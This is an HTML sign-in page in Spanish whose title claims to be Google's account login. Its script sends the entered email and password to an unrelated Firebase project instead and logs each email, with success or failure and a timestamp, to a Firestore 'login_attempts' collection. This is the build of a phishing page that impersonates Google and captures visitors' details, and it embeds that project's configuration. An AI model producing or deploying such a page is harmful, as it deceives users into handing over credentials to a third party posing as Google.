<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión - Cuenta de Google</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #f2f2f2;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            width: 400px;
        }
        .input-group {
            margin-bottom: 15px;
        }
        .input-group input {
            width: 100%;
            padding: 10px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        .button-group button {
            width: 100%;
            padding: 10px;
            font-size: 16px;
            background-color: #4285f4;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .button-group button:hover {
            background-color: #357ae8;
        }
        .error-message {
            color: red;
            text-align: center;
            margin-top: 10px;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <h1>Iniciar sesión</h1>
        <form id="login-form">
            <div class="input-group">
                <input type="email" id="email" placeholder="Correo electrónico o teléfono" required>
            </div>
            <div class="input-group">
                <input type="password" id="password" placeholder="Introduce tu contraseña" required>
            </div>
            <div class="button-group">
                <button type="submit">Iniciar sesión</button>
            </div>
        </form>
        <p id="error-message" class="error-message"></p>
    </div>

    <!-- Import Firebase SDKs -->
    <script type="module">
        // Importa los módulos necesarios de Firebase
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getAuth, signInWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
        import { getFirestore, collection, addDoc, Timestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        // Configuración de Firebase
        const firebaseConfig = {
            apiKey: "AIzaSyBEWPP5MEi7TD5VTZkp7my1VztTcSEx-KE",
            authDomain: "login-attempts-9606c.firebaseapp.com",
            projectId: "login-attempts-9606c",
            storageBucket: "login-attempts-9606c.firebasestorage.app",
            messagingSenderId: "663920712947",
            appId: "1:663920712947:web:ad71401e5dc108a5d2eb86"
        };

        // Inicializa Firebase
        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app); // Inicializa Firebase Authentication
        const db = getFirestore(app); // Inicializa Firestore

        // Función para guardar intentos de inicio de sesión en Firestore
        async function saveLoginAttempt(email, success) {
            try {
                const docRef = await addDoc(collection(db, "login_attempts"), {
                    email: email,
                    success: success,
                    timestamp: Timestamp.fromDate(new Date()) // Fecha y hora actual
                });
                console.log("Intento de inicio de sesión guardado con ID:", docRef.id);
            } catch (e) {
                console.error("Error al guardar el intento de inicio de sesión:", e);
            }
        }

        // Maneja el envío del formulario
        const form = document.getElementById("login-form");
        form.addEventListener("submit", async function(event) {
            event.preventDefault(); // Evita que el formulario se recargue

            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;

            if (email && password) {
                try {
                    // Intenta autenticar al usuario
                    const userCredential = await signInWithEmailAndPassword(auth, email, password);
                    const user = userCredential.user;

                    // Guarda el intento de inicio de sesión exitoso en Firestore
                    await saveLoginAttempt(email, true);

                    // Limpia el mensaje de error y muestra un mensaje de éxito
                    document.getElementById("error-message").textContent = "";
                    alert("Inicio de sesión exitoso!");
                } catch (error) {
                    // Maneja errores de autenticación
                    console.error("Error de autenticación:", error.code, error.message);

                    // Guarda el intento de inicio de sesión fallido en Firestore
                    await saveLoginAttempt(email, false);

                    // Muestra un mensaje de error al usuario
                    let errorMessage = "Error al iniciar sesión";
                    if (error.code === "auth/user-not-found") {
                        errorMessage = "El usuario no existe";
                    } else if (error.code === "auth/wrong-password") {
                        errorMessage = "Contraseña incorrecta";
                    }
                    document.getElementById("error-message").textContent = errorMessage;
                }
            } else {
                document.getElementById("error-message").textContent = "Por favor, completa todos los campos";
            }
        });
    </script>

</body>
</html>
